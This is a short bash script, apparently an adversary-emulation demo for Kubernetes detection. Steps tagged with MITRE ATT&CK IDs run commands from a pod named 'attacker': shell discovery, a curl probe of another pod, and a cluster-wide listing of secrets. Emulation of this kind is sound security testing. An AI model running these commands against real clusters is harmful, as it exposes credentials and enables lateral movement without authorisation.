#!/bin/bash
set -x

echo "### STEP 1: T1021 + T1059 — remote exec + shell spawn ###"
kubectl exec attacker -- bash -c "id && whoami"
sleep 3

echo ""
echo "### STEP 2: T1610 — lateral network movement (attacker -> legitimate-app) ###"
LEGIT_IP=$(kubectl get pod legitimate-app -o wide --no-headers | awk '{print $6}')
echo "target IP: $LEGIT_IP"
kubectl exec attacker -- curl -s --max-time 3 -o /dev/null -w "curl http_code=%{http_code}\n" "http://${LEGIT_IP}"
sleep 3

echo ""
echo "### STEP 3: T1552 — secret access via K8s API (cluster-wide, real secrets) ###"
kubectl exec attacker -- kubectl get secrets -A
sleep 2

echo ""
echo "### DONE ###"
